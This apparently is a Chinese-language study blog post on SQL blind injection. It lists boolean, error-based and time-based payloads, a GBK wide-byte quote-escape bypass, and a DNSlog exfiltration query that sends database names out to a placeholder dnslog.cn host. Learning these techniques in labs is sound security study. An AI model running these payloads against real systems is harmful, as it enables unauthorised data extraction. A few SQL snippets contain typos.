---
title:  "sql注入学习"
published: 2025-12-03 
description: "sql盲注的学习过程"
image: "./fa07124e82169ceaad720d9f812c0b42.jpg"
tags: ["sql注入","web安全","靶场"]
category: 网安
draft: false
---
# 本篇文章是关于sql盲注的学习过程，主要内容如下：
<a id="top"></a>

- [布尔盲注](#布尔盲注)
    - [mid()函数](#mid函数)
    - [substr()函数](#substr函数)
    - [left()函数](#left函数)
    - [ord()函数](#ord函数)

- [报错盲注](#报错盲注)
    - [updatexml()函数](#updatexml函数)
- [时间盲注](#时间盲注)
    - [sleep()函数](#sleep函数)
    - [if()函数](#if函数)
- [宽字节注入](#宽字节注入)
- [DNSlog注入](#dnslog注入)
---
# 布尔盲注
## mid函数
|mid()函数|此函数作用为截取字符串。mid(column_name,start,length)|
|--- | ---   |
|`参数`|描述|
|`column_name`|必需，要截取的字段名|
|`start`|必需，开始位置（起始值为1）。|
|`length`|可选，要截取的长度。如果省略，则截取从start位置到字符串末尾的字符。|
eg: str"123456" mid(str,2,1) 结果为：2
`sql用例：`
```sql
(1)mid(database(),1,1)>'a' 去判断数据库第一位。
(2)mid((select table_nane from information_schema.tables where table_schema=0xxxxx limit 0,1),1,1)>'a' 去判断数据库第一个表的第一位。
```

## substr函数
|substr()函数|也是截取字符串。substr(string,start,length)|
|--- | ---   |
|`参数`|描述|
|`string`|必需，要截取的字符串|
|`start`|必需，开始位置（起始值为1）。|
|`length`|可选，要截取的长度。如果省略，则截取从start位置到字符串末尾的字符。|
`sql用例：`
```sql
(1)substr(database(),1,1)>'a' 去判断数据库名第一位。
(2) substr((SELECT table_name FROM INFORMATION_SCHEMA.TABLES WHERE T table_schema=0xxxxxxx LIMIT 0,1),1,1)>’a’此处string参数可以为sql语句，可自行构造sql语句进行注入。
```

## left函数
|left()函数|此函数作用为从字符串左边截取指定长度的字符。left(column_name,length)|
|--- | ---   |
|`参数`|描述|
|`column_name`|必需，要截取的字段名|
|`length`|必需，要截取的长度。如果省略，则截取从start位置到字符串末尾的字符。|
`sql用例：`
```sql
(1)left(database(),1)>'a' 去判断数据库名第一位。
lefrt(database(),2)>'ab' 去判断数据库名前两位。
(2)left((SELECT table_name FROM INFORMATION_SCHEMA.TABLES WHERE T table_schema=0xxxxxxx LIMIT 0,1),1)>’a’此处string参数可以为sql语句，可自行构造sql语句进行注入。
```

## ord函数
|ord()函数|此函数作用为返回字符的ASCII码。ord(column_name)|
|--- | ---   |
|`参数`|描述|
|`column_name`|必需，要获取ASCII码的字符。|
`sql用例：`
```sql
(1)ord(mid(database(),1,1))=65 去判断数据库名第一位的ASCII码是否为65。
(2)ord(left(database(),1))=65 去判断数据库名第一位的ASCII码是否为65。
(3)ord(substr(database(),1,1))=65 去判断数据库名第一位的ASCII码是否为65。
在这个里面我们可以去用ASCII码去一一对应字母，然后去判断。
```
[ASCII码表](https://www.runoob.com/w3cnote/ascii.html)
[🔝 回到顶部](#top)


---

# 报错盲注
## updatexml函数
|updatexml()函数|此函数作用为更新XML文档。updatexml(column_name,xpath_expression,new_value)|
|--- | ---   |
|`参数`|描述|
|`column_name`|必需，要更新的XML文档的字段名。|
|`xpath_expression`|必需，要更新的XML文档的xpath表达式。|
|`new_value`|必需，要更新的XML文档的新值。|
`sql用例：`
```sql
(1)在我们用在报错盲注中第一个与第三个参数可以随便写，重点在第二个参数需要让它不符合XPATH格式。
(2)在用这个函数的时候我们需要同时用到concat函数去拼接别的字符让它报错，比如 updatexml(1,concat(0x7e,database()),1)这个的结果会是 ~数据库名。
同理，updatexml(1,concat(0x7e,(SELECT table_name FROM INFORMATION_SCHEMA.TABLES WHERE  table_schema=0xxxxxxx )),1)的结果会是 ~表名。
同时我们还能进一步改进一下在第二个参数前加上group_concat,这样我们能得到全部的表名。
```
[🔝 回到顶部](#top)

# 时间盲注
## if函数
|if()函数|此函数作用为条件判断。if(condition,true_value,false_value)|
|--- | ---   |
|`参数`|描述|
|`condition`|必需，条件表达式，如果为真则返回true_value，否则返回false_value。|
|`true_value`|必需，条件为真时返回的值。|
|`false_value`|必需，条件为假时返回的值。|
`sql用例：`
```sql
(1)if(1=1,1,0) 结果为1。
(2)if(1=2,1,0) 结果为0。
(3)if(1=1,sleep(1),0) 等待1秒。
```
## sleep函数
|sleep()函数|此函数作用为暂停执行指定秒数。sleep(seconds)|
|--- | ---   |
|`参数`|描述|
|`seconds`|必需，要暂停的秒数。|
`sql用例：`
```sql
(1)sleep(1) 等待1秒。
(2)sleep(if(1=1,1,0)) 等待1秒。
(3)sleep(if(1=2,1,0)) 等待0秒。
```

# 宽字节注入
在我们进行sql注入时，有时当我们用到单引号时，编写程序的人可能会把单引号转义为反斜杠加上一个单引号 ，这个时候我们可以用到宽字节注入来让单引号逃逸，方法是?id=1%df'。

这个方法是利用sql使用GBK编码（GNK占用两个字节，ASCII占用一个字节。）然后把两个字符看成一个汉字，这样就能绕过sql的单引号转义。

过程大概是这样：    
%df'=>%df\'（单引号会被加上转义字符\）
%df\'=>%df%5c'（\的十六进制为%5c）  
%df%5c'=>縗'（GBK编码时会认为这时一个宽字节）   
'成功逃逸，sql语法正确
[🔝 回到顶部](#top)

# DNSlog注入
[fofa平台] (https://en.fofa.info/) 在fofa平台搜索DNSLog Platform，可以找到很多DNSlog平台，可以进行DNSlog注入。

1.我们需要构造一个包含数据库信息的子域名，例如(select database()).xxx.dnslog.cn。这个子域名可以使用MySQL的函数或者操作符来拼接，例如concat、replace、substr等。   
2.接着，需要使用MySQL的load_file函数或其他方法，让目标服务器向DNS服务器发起解析请求。例如，使用以下语句： 
select load_file(concat(‘\\\\’,(select database()),‘.xxx.dnslog.cn/abc’));  
这个语句会让目标服务器尝试从(select database()).xxx.dnslog.cn/abc这个地址加载文件，从而触发DNS解析请求。    
3.最后，需要在DNSlog平台上查看DNS请求记录，就可以获取数据库信息了。例如，在上面的例子中，如果数据库名为security，那么就会看到security.xxx.dnslog.cn这样的记录。

DNSlog注入需要注意的点：    
1.由于每一级域名的长度只能为63个字符，所以在MySQL中获取到超过63个字节的字符时，会被当作一个错误的域名，不会产生去解析的动作。所以需要控制查询结果的字符长度在63个以内。   
2.由于URL中传递的字符非常有限，很多特殊字符如{,},!,等是无法传递的。这就会导致load_file函数失效。所以需要对查询结果进行hex编码，然后再使用16进制解码网站来还原结果。

DNSlog注入的条件：    
1.目标服务器可以发起DNS请求，即可以访问外部网络。  
2.目标服务器可以执行一些函数或命令，如load_file、exec、curl等，用于向DNS服务器发送域名查询。  
3.攻击者拥有一个自己的域名，并能够配置NS记录和获取DNS日志，用于接收目标服务器发送的域名查询信息。  
4.目标服务器返回的数据不超过域名长度限制（63个字符），并且不包含特殊符号，否则会导致DNS查询失败。 
[🔝 回到顶部](#top)
